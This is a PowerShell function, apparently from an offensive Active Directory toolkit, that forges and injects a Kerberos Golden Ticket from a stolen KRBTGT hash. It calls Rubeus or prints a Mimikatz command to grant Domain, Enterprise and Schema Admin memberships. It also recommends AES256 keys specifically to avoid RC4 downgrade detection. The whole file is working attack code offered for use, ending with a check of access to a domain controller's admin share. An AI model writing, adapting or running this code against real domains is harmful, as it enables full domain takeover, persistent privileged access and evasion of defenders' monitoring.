function Invoke-GoldenTicket {
    <#
    .SYNOPSIS
        Forge and inject a Golden Ticket TGT using the KRBTGT hash.

    .DESCRIPTION
        Creates a forged TGT signed with the KRBTGT hash, granting
        Domain Admin, Enterprise Admin, and Schema Admin group memberships.
        Supports both RC4 (NTLM) and AES256 encryption keys.

        AES256 is stealthier as it matches the domain's default encryption
        and avoids RC4 downgrade detection.

    .PARAMETER User
        Username to impersonate. Defaults to "Administrator".

    .PARAMETER KrbtgtHash
        KRBTGT NTLM hash (from DCSync).

    .PARAMETER DomainSID
        Domain SID (e.g., S-1-5-21-1234567890-...).

    .PARAMETER Domain
        Target domain. Defaults to current domain.

    .PARAMETER KrbtgtAES256
        KRBTGT AES256 key for stealthier forging.

    .PARAMETER UserID
        User RID to embed. Defaults to 500 (Administrator).

    .PARAMETER Groups
        Comma-separated group RIDs. Defaults to DA/EA/SA.

    .EXAMPLE
        Invoke-GoldenTicket -KrbtgtHash "a9d6d7e8..." -DomainSID "S-1-5-21-..."
    #>

    param(
        [string]$User = "Administrator",
        [Parameter(Mandatory)][string]$KrbtgtHash,
        [Parameter(Mandatory)][string]$DomainSID,
        [string]$Domain = (Get-ADDomain).DNSRoot,
        [string]$KrbtgtAES256 = "",
        [int]$UserID = 500,
        [string]$Groups = "512,513,518,519,520"
    )

    Write-Host "`n[*] Golden Ticket: $Domain\$User (RID $UserID)" -ForegroundColor Cyan
    Write-Host "[*] Groups: Domain Admins, Enterprise Admins, Schema Admins" -ForegroundColor Yellow

    if (Test-Path ".\Rubeus.exe") {
        if ($KrbtgtAES256) {
            Write-Host "[*] Using AES256 (matches domain encryption)" -ForegroundColor Green
            & .\Rubeus.exe golden /user:$User /domain:$Domain /sid:$DomainSID `
                /aes256:$KrbtgtAES256 /id:$UserID /groups:$Groups /ptt
        }
        else {
            & .\Rubeus.exe golden /user:$User /domain:$Domain /sid:$DomainSID `
                /rc4:$KrbtgtHash /id:$UserID /groups:$Groups /ptt
        }
    }
    else {
        Write-Host "[-] Rubeus not found. Mimikatz commands:" -ForegroundColor Red
        Write-Host "    kerberos::golden /user:$User /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /id:$UserID /groups:$Groups /ptt"
    }

    Write-Host "`n[+] Golden Ticket injected. Verify with: klist" -ForegroundColor Green
    Write-Host "[*] Test: dir \\DC01\C$" -ForegroundColor Cyan
}